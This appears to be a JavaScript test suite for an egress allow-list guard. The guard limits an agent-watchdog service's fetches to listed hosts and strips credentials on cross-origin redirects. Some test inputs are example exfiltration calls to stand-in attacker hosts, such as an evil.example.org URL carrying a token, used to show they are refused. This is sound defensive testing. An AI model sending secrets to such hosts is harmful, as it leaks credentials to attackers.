// FR-083 (revision 30): the destinations a run contacts are code plus configuration, printable for the platform's
// policy and enforced in process for every fetch of the run; anything else is refused before a connection.
const codes = require('../../src/cli/exit-codes');
const {
  buildEgress, isEgressAllowed, guardFetch, installEgressGuard, egressDocument, originOf, EgressRefusedError,
  FIXED_ENDPOINTS, CONFIGURED_ENDPOINTS,
} = require('../../src/net/egress');
const { quietLogger } = require('../rollup/factories');

const endpoints = () => ({
  grafanaUrl: 'https://watchdog.example.org',
  langfuseBaseUrl: 'https://langfuse.example.org',
  docsMcpUrl: 'https://docs-mcp.example.org/mcp',
  specsUrl: 'https://github.com/medic/cht-ai-tools/tree/main/packages/agent-watchdog/specs/001-watchdog-slack-loop',
  configUrl: 'https://github.com/medic/medic-infrastructure',
  slackChannelId: 'C123',
});
const config = (overrides = {}) => ({
  endpoints: { ...endpoints(), ...overrides }, secrets: { grafanaToken: 'glsa_x' },
});

describe('net/egress: the allow-list', () => {
  it('lists the fixed destinations and the configured endpoints once each, sorted, with purposes and sources', () => {
    const egress = buildEgress(config());
    expect(egress.endpoints.map((e) => `${e.host}:${e.port}`)).to.deep.equal([
      'api.anthropic.com:443', 'docs-mcp.example.org:443', 'docs.communityhealthtoolkit.org:443', 'files.slack.com:443',
      'forum.communityhealthtoolkit.org:443', 'github.com:443', 'langfuse.example.org:443', 'slack.com:443',
      'watchdog.example.org:443',
    ]);
    const github = egress.endpoints.find((e) => e.host === 'github.com');
    expect(github.sources).to.deep.equal(['code', 'AGENT_WATCHDOG_SPECS_URL', 'AGENT_WATCHDOG_CONFIG_URL']);
    expect(github.purposes).to.have.length(2);
    expect(github.purposes[0]).to.match(/reference links/);
    const grafana = egress.endpoints.find((e) => e.host === 'watchdog.example.org');
    expect(grafana).to.deep.include({ port: 443, sources: ['AGENT_WATCHDOG_GRAFANA_URL'] });
    expect(grafana.purposes[0]).to.match(/dashboards/);
    expect(egress.endpoints.every((e) => Array.isArray(e.purposes) && e.purposes.length > 0)).to.equal(true);
    expect(FIXED_ENDPOINTS.map((e) => e.host))
      .to.include.members(['slack.com', 'files.slack.com', 'api.anthropic.com']);
    expect(CONFIGURED_ENDPOINTS.map((e) => e.env))
      .to.include.members(['AGENT_WATCHDOG_GRAFANA_URL', 'LANGFUSE_BASE_URL']);
  });

  it('keeps an explicit port, defaults http to 80 and https to 443, and leaves unset endpoints out', () => {
    const local = buildEgress(config({ grafanaUrl: 'http://127.0.0.1:3000', langfuseBaseUrl: null, docsMcpUrl: undefined }));
    const hosts = local.endpoints.map((e) => `${e.host}:${e.port}`);
    expect(hosts).to.include('127.0.0.1:3000');
    expect(hosts).to.not.include('langfuse.example.org:443');
    expect(hosts).to.not.include('docs-mcp.example.org:443');
    expect(buildEgress({ endpoints: {} }).endpoints).to.have.length(FIXED_ENDPOINTS.length);
    expect(buildEgress({}).endpoints).to.have.length(FIXED_ENDPOINTS.length);
    expect(originOf('http://a.example.org/x')).to.deep.equal({ host: 'a.example.org', port: 80 });
    expect(originOf('https://A.Example.org:8443/x')).to.deep.equal({ host: 'a.example.org', port: 8443 });
    expect(originOf('not a url')).to.equal(null);
    expect(originOf(null)).to.equal(null);
  });

  it('allows a destination by host and port only, case-insensitively, and refuses everything else', () => {
    const egress = buildEgress(config());
    expect(isEgressAllowed('https://watchdog.example.org/api/health', egress)).to.equal(true);
    expect(isEgressAllowed('https://GitHub.com/medic/x', egress)).to.equal(true);
    expect(isEgressAllowed(new URL('https://slack.com/api/chat.postMessage'), egress)).to.equal(true);
    expect(isEgressAllowed('https://watchdog.example.org:8443/', egress)).to.equal(false);
    expect(isEgressAllowed('http://watchdog.example.org/', egress)).to.equal(false);
    expect(isEgressAllowed('https://evil.example.org/', egress)).to.equal(false);
    expect(isEgressAllowed('https://watchdog.example.org.evil.example/', egress)).to.equal(false);
    expect(isEgressAllowed('not a url', egress)).to.equal(false);
    expect(isEgressAllowed('https://watchdog.example.org/', { endpoints: [] })).to.equal(false);
  });
});

describe('net/egress: the guard on fetch', () => {
  const egress = buildEgress(config());

  it('calls through with the same arguments for a string, a URL and a Request-like object', async () => {
    const inner = sinon.stub().resolves('response');
    const logger = quietLogger();
    const fetch = guardFetch(inner, egress, { logger });
    const init = { method: 'HEAD' };
    expect(await fetch('https://watchdog.example.org/api/x', init)).to.equal('response');
    expect(await fetch(new URL('https://slack.com/api/y'))).to.equal('response');
    expect(await fetch({ url: 'https://github.com/medic/z' })).to.equal('response');
    // The guard follows redirects itself (revision 33), so it asks fetch for manual ones.
    expect(inner.firstCall.args).to.deep.equal(['https://watchdog.example.org/api/x', { ...init, redirect: 'manual' }]);
    expect(inner.callCount).to.equal(3);
    expect(logger.events.filter((e) => e.event === 'egress.refused')).to.deep.equal([]);
  });

  it('refuses an unlisted destination before the call: exit 69 naming host and port, never the URL', async () => {
    const inner = sinon.stub().resolves('response');
    const logger = quietLogger();
    const fetch = guardFetch(inner, egress, { logger });
    let error;
    try {
      await fetch('https://evil.example.org:8443/exfiltrate?token=glsa_secret');
    } catch (e) {
      error = e;
    }
    expect(error).to.be.instanceOf(EgressRefusedError);
    expect(error).to.be.instanceOf(codes.ExitError);
    expect(error.code).to.equal(codes.UNAVAILABLE);
    expect(error.message).to.include('evil.example.org:8443');
    expect(error.message).to.not.include('exfiltrate');
    expect(error.message).to.not.include('glsa_secret');
    expect(error.details).to.deep.equal({ host: 'evil.example.org', port: 8443 });
    expect(inner.called).to.equal(false);
    const refused = logger.events.filter((e) => e.event === 'egress.refused');
    expect(refused).to.have.length(1);
    expect(refused[0]).to.include({ level: 'error', host: 'evil.example.org', port: 8443 });
    expect(JSON.stringify(refused[0])).to.not.include('exfiltrate');
    // A value that is not a URL is refused too: nothing unparseable reaches the network.
    await expect(fetch('nowhere')).to.be.rejectedWith(EgressRefusedError);
  });

  it('installs on a target once, guards its fetch, and restores the original on uninstall', async () => {
    const original = sinon.stub().resolves('ok');
    const target = { fetch: original };
    const logger = quietLogger();
    const guard = installEgressGuard({ egress, logger, target });
    expect(target.fetch).to.not.equal(original);
    expect(guard.fetch).to.equal(target.fetch);
    expect(await target.fetch('https://watchdog.example.org/')).to.equal('ok');
    await expect(target.fetch('https://evil.example.org/')).to.be.rejectedWith(EgressRefusedError);
    // A second install on a guarded target changes nothing and its uninstall is a no-op.
    const again = installEgressGuard({ egress, logger, target });
    expect(again.fetch).to.equal(guard.fetch);
    again.uninstall();
    expect(target.fetch).to.equal(guard.fetch);
    guard.uninstall();
    expect(target.fetch).to.equal(original);
    guard.uninstall();
    expect(target.fetch).to.equal(original);
  });

  it('describes the egress for the platform: the endpoints, no inbound, the exempt command, no secret', () => {
    const document = egressDocument(config(), { version: '1.2.3' });
    expect(document).to.include({ package: '@medic/agent-watchdog', version: '1.2.3', inbound: 'none' });
    expect(document.endpoints).to.deep.equal(egress.endpoints);
    expect(document.exempt).to.deep.equal([{
      command: 'check',
      reason: 'contacts the CHT host the operator names; the platform policy refuses it inside the container',
    }]);
    expect(document.notes.some((n) => /platform/.test(n))).to.equal(true);
    expect(JSON.stringify(document)).to.not.include('glsa_x');
  });
});

describe('net/egress: redirects and the guard around a command (FR-083, revision 33)', () => {
  const { withEgressGuard } = require('../../src/net/egress');
  const egress = buildEgress(config());
  const redirect = (status, location) => ({ status, headers: new Headers({ location }), ok: false });
  const final = { status: 200, headers: new Headers(), ok: true };

  it('refuses a redirect to an unlisted host after the first hop, naming that host', async () => {
    const inner = sinon.stub().resolves(redirect(302, 'https://evil.example.org/collect'));
    const logger = quietLogger();
    const fetch = guardFetch(inner, egress, { logger });
    const error = await fetch('https://watchdog.example.org/api/x').catch((e) => e);
    expect(error).to.be.instanceOf(EgressRefusedError);
    expect(error.details).to.deep.equal({ host: 'evil.example.org', port: 443 });
    expect(inner).to.have.been.calledOnce;
    expect(inner.firstCall.args[1]).to.include({ redirect: 'manual' });
  });

  it('follows a redirect to a listed host with the right method and returns the final response', async () => {
    const inner = sinon.stub();
    inner.onCall(0).resolves(redirect(303, 'https://slack.com/api/done'));
    inner.onCall(1).resolves(final);
    const fetch = guardFetch(inner, egress, { logger: quietLogger() });
    expect(await fetch('https://slack.com/api/start', { method: 'POST', body: 'x' })).to.equal(final);
    expect(inner.secondCall.args[0]).to.equal('https://slack.com/api/done');
    expect(inner.secondCall.args[1]).to.include({ method: 'GET', redirect: 'manual' });
    expect(inner.secondCall.args[1].body).to.equal(undefined);
    const keep = sinon.stub();
    keep.onCall(0).resolves(redirect(307, '/api/again'));
    keep.onCall(1).resolves(final);
    const again = guardFetch(keep, egress, { logger: quietLogger() });
    await again('https://watchdog.example.org/api/x', { method: 'POST', body: 'y' });
    expect(keep.secondCall.args[0]).to.equal('https://watchdog.example.org/api/again');
    expect(keep.secondCall.args[1]).to.include({ method: 'POST', body: 'y' });
  });

  it('hands a redirect back untouched when the caller asked for manual redirects, and caps the hops', async () => {
    const inner = sinon.stub().resolves(redirect(301, 'https://slack.com/next'));
    const fetch = guardFetch(inner, egress, { logger: quietLogger() });
    const response = await fetch('https://slack.com/first', { redirect: 'manual' });
    expect(response.status).to.equal(301);
    expect(inner).to.have.been.calledOnce;
    const error = await fetch('https://slack.com/first').catch((e) => e);
    expect(error).to.be.instanceOf(TypeError);
    expect(error.message).to.match(/redirect/);
    expect(inner.callCount).to.equal(1 + 6);
  });

  it('drops the credentials when a redirect leaves the origin, whatever form the headers came in', async () => {
    const token = 'xoxb-000-test-token';
    const forms = [
      new Headers({
        Authorization: `Bearer ${token}`, Cookie: 'a=b', 'Proxy-Authorization': 'Basic x', Accept: 'application/json',
      }),
      [['authorization', `Bearer ${token}`], ['cookie', 'a=b'], ['accept', 'application/json']],
      { Authorization: `Bearer ${token}`, cookie: 'a=b', Accept: 'application/json' },
    ];
    for (const headers of forms) {
      const inner = sinon.stub();
      inner.onCall(0).resolves(redirect(307, 'https://watchdog.example.org/api/next'));
      inner.onCall(1).resolves(final);
      const fetch = guardFetch(inner, egress, { logger: quietLogger() });
      await fetch('https://slack.com/api/start', { method: 'POST', body: 'x', headers });
      const sent = new Headers(inner.secondCall.args[1].headers);
      expect(sent.get('authorization'), 'authorization').to.equal(null);
      expect(sent.get('cookie'), 'cookie').to.equal(null);
      expect(sent.get('proxy-authorization'), 'proxy-authorization').to.equal(null);
      expect(sent.get('accept'), 'the other headers travel').to.equal('application/json');
      expect(JSON.stringify(inner.secondCall.args)).to.not.include(token);
      // The caller's own headers object is not modified.
      expect(new Headers(headers).get('authorization')).to.equal(`Bearer ${token}`);
    }
  });

  it('keeps the credentials on a redirect within the origin and refuses a step down from https to http', async () => {
    const inner = sinon.stub();
    inner.onCall(0).resolves(redirect(302, '/api/again'));
    inner.onCall(1).resolves(final);
    const fetch = guardFetch(inner, egress, { logger: quietLogger() });
    await fetch('https://slack.com/api/start', { headers: { Authorization: 'Bearer keep-me' } });
    expect(new Headers(inner.secondCall.args[1].headers).get('authorization')).to.equal('Bearer keep-me');
    const downgrade = sinon.stub().resolves(redirect(301, 'http://slack.com:443/api/plain'));
    const logger = quietLogger();
    const guarded = guardFetch(downgrade, egress, { logger });
    const error = await guarded('https://slack.com/api/start').catch((e) => e);
    expect(error).to.be.instanceOf(TypeError);
    expect(error.message).to.equal('redirect refused: https://slack.com/api/start redirected to a plain http URL');
    expect(downgrade).to.have.been.calledOnce;
  });

  it('withEgressGuard guards the global for a command\'s duration and wraps an injected fetch', async () => {
    const original = sinon.stub().resolves('ok');
    const target = { fetch: original };
    const injected = sinon.stub().resolves('injected');
    let seen;
    const result = await withEgressGuard(
      { config: config(), logger: quietLogger(), deps: { fetch: injected }, target },
      async (deps) => {
        seen = { guarded: target.fetch.egressGuard === true, injectedGuarded: deps.fetch.egressGuard === true };
        await expect(deps.fetch('https://evil.example.org/')).to.be.rejectedWith(EgressRefusedError);
        return deps.fetch('https://slack.com/api/x');
      },
    );
    expect(result).to.equal('injected');
    expect(seen).to.deep.equal({ guarded: true, injectedGuarded: true });
    expect(target.fetch).to.equal(original);
    expect(injected).to.have.been.calledOnceWith('https://slack.com/api/x');
  });
});
